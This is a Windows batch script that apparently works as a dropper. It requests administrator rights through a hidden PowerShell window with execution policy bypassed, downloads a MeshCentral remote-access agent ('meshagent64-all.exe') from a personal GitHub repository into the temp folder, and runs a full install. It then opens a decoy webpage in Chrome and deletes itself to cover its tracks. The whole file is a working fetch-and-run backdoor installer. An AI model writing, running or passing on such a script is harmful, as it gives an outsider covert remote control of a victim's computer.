@echo off
setlocal

:: Check for administrative privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%~f0""' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: Define variables
set "URL=https://github.com/eastoncrafter/eastoncrafter.github.io/raw/refs/heads/main/meshagent64-all.exe"
set "FILENAME=meshagent64-all.exe"
set "DEST=%TEMP%\%FILENAME%"
set "WEBPAGE=https://example.com"

:: Download the file using PowerShell
echo Downloading %FILENAME%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%DEST%')"

:: Check if the file was downloaded
if exist "%DEST%" (
    echo Running installer...
    "%DEST%" -fullinstall
) else (
    echo Download failed!
    exit /b
)

:: Open the link in Chrome
echo Opening webpage...
start chrome "%WEBPAGE%"

:: Delete this script
echo Deleting script...
(
    echo @echo off
    echo del /f /q "%~f0"
) > "%TEMP%\delete_me.bat"
start /b cmd /c "%TEMP%\delete_me.bat"

exit